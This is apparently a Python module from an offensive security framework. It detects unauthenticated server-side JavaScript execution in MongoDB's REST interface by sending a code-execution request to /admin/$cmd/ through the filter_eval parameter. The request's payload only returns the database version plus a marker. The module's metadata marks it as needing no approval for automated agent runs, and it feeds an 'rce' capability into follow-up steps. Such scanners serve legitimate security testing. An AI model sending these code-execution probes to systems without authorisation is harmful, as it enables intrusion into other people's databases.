#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MongoDB REST interface SSJS code execution."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MongoDB REST - SSJS RCE Detection',
        'description': (
            'Detects MongoDB REST interface SSJS execution via '
            '/admin/$cmd/?filter_eval=function(){...}.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'mongodb', 'ssjs', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/22783',
        ],
    }

    port = OptPort(28017, 'MongoDB REST HTTP port', True)

    def run(self):
        token = '_' + self.random_text(8)
        path = (
            '/admin/$cmd/?filter_eval=function%28%29%20{%20val=db.version%28%29;%20'
            'bar=val%2b%27' + token + '%27;%20return%20bar;%20}&limit=1'
        )
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        body = r.text or ''
        if 'REST is not enabled' in body:
            return False
        if 'total_rows' in body and 'retval' in body and token in body:
            self.set_info(
                severity='critical',
                reason='MongoDB REST SSJS execution',
                path='/admin/$cmd/',
            )
            return True
        return False
